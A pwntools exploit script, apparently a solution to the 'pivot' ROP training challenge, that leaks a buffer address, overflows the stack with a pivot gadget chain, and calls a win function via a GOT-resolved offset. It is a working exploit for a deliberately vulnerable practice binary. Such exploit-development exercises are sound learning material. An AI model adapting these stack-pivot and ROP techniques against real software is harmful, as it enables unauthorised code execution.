from pwn import *

elf = ELF('pivot')
io = process(elf.path)

# gadgets
pop_rax = 0x4009bb
loc_rax_to_rax = 0x4009c0
pop_rbp = 0x400805
add_rax_rbp = 0x4009c4
call_rax = 0x4006b0
xchg_rsp_rax = 0x4009bd

# values
foothold_plt = elf.plt.foothold_function
foothold_got = elf.got.foothold_function
foothold_to_win = 0x117


# call foothold so got gets resolved
rop_chain = p64(foothold_plt)

# get actual foothold addr into rax
rop_chain += p64(pop_rax)
rop_chain += p64(foothold_got)
rop_chain += p64(loc_rax_to_rax)

# add offset to rax
rop_chain += p64(pop_rbp)
rop_chain += p64(foothold_to_win)
rop_chain += p64(add_rax_rbp)

# call rax
rop_chain += p64(call_rax)

io.recvuntil(b'upon you a place to pivot: ')
buffer_provided = int(io.recvuntil(b'Send a ROP ').strip()[0:14], 16)
io.recvuntil(b'>')
io.sendline(rop_chain)

log.info('Fake stack location: ' + hex(buffer_provided))

stack_pivot = p64(pop_rax)
stack_pivot += p64(buffer_provided)
stack_pivot += p64(xchg_rsp_rax)

stager = b'A' * 40 + stack_pivot

io.recvuntil(b'>')
io.sendline(stager)

with open('payload', 'wb') as fh:
    fh.write(rop_chain)
    fh.write(stager)

io.interactive()
